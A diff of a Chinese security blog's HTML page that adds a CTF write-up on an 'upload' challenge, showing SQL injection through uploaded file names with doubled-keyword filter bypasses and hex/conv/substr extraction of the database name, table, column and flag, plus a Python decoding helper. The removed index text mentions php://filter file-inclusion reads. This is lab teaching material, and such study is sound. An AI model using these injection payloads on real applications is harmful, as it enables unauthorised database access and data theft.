@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Smtsec&#39;s Studio</title>
+    <title>upload · Smtsec&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Smtsec&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">upload</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Smtsec's Studio.</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            upload
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">696</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/12/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,77 +399,90 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/09/30/CumtCTF2019华为杯/" >
-            
-                <span>CumtCTF2019华为杯</span>
-        </a>
-        <div class="abstract-content">
-            Web签到题点开链接为seed和hash参数的提交框，尝试admin，admin，返回Fail…;查看响应，发现有payload，提示访问index.php?source=1发现php代码:
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpfunction gen_secured_random() &#123; // cause random is the way    $...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/09/24/文件包含漏洞/" >
-            
-                <span>文件包含漏洞</span>
-        </a>
-        <div class="abstract-content">
-            php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。
-用法：
-123?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h1><p>根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111);<br>登录就出现了上传文件的页面如下：<br><img src="https://s2.ax1x.com/2019/12/16/QhshQS.png" alt="QhshQS.png"><br>尝试上传文件，发现只有jpg格式的文件可以上传<br>尝试上传php.jpg</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；
-MOCTF上这道文件包含题，直接
-1?file=php://filter/c...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
+<p>burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤；</p>
+<p>#分析：<br><strong>题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；</strong><br><strong>图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析；</strong><br>参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；<br>*后端插入语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名</span><br><span class="line"><span class="keyword">VALUES</span>（被插入新行中的值）</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：（文件名）</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(<span class="keyword">select</span> <span class="keyword">database</span>())+<span class="string">'.jpg</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到select被过滤了，尝试双写绕过：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect database())+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>页面回显均为0；<br>尝试转换格式：<br>转为16进制：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect hex(database()))+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>页面回显为：7765625<br>分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)<br>转10进制输出:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>*MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。<br>当定义的参数为NULL时，返回值将为NULL。<br>最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。<br>该函数出现在MySQL版本：<br>5.6语法：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">CONV(N,<span class="params">from_base</span>,<span class="params">to_base</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>页面回显为：1.8446744073709552e19<br>分析(回显科学计数法，应该是输出位数过长)<br>使用substr分割输出：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>页面回显为：131277325825392<br>转16进制再转为ascll,<br>得到：web_up</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeascll</span><span class="params">(number)</span>:</span></span><br><span class="line">    number=str(hex(number))[<span class="number">2</span>:]</span><br><span class="line">    s1=[number[i:(i+<span class="number">2</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(number),<span class="number">2</span>)]</span><br><span class="line">    s2=[int(i,<span class="number">16</span>)<span class="keyword">for</span> i <span class="keyword">in</span> s1]</span><br><span class="line">    s3=[chr(i)<span class="keyword">for</span> i <span class="keyword">in</span> s2]</span><br><span class="line">    s=<span class="string">""</span>.join(s3)</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">changeascll(<span class="number">131277325825392</span>)</span><br></pre></td></tr></table></figure>
+
+<p>提取后半部分字符：1819238756</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">13</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名：web_upload</p>
+<p>同样使用上述方法爆表<br>payload：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>114784820031327<br>112615676665705<br>126853610566245<br>得到表名：hello_flag_is_here<br>爆字段<br>payload:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='</span>hello_flag_is_her<span class="string">e' limit 0,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure>
+
+<p>115858377367398<br>7102823<br>得到字段名：i_am_flag<br>爆值<br>payload：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
+
+<p>36427215695199<br>92806431727430<br>560750951<br>得到值：!!<a href="mailto:_@m_Th.e_F" target="_blank" rel="noopener">_@m_Th.e_F</a>!lag</p>
+
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://singlemindedt.github.io">Smtsec</a>
+            <p>原文链接：<a href="https://singlemindedt.github.io/2019/12/16/upload/">https://singlemindedt.github.io/2019/12/16/upload/</a>
+            <p>发表日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 16th 2019, 8:14:47 am</a>
+            <p>更新日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 16th 2019, 7:36:18 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/12/13/安装PyCharm/" title= "安装PyCharm">
+                    <div class="prevTitle">安装PyCharm</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -497,6 +571,24 @@ MOCTF上这道文件包含题，直接
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#初探"><span class="toc-number">1.</span> <span class="toc-text">初探</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1460,6 +1552,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
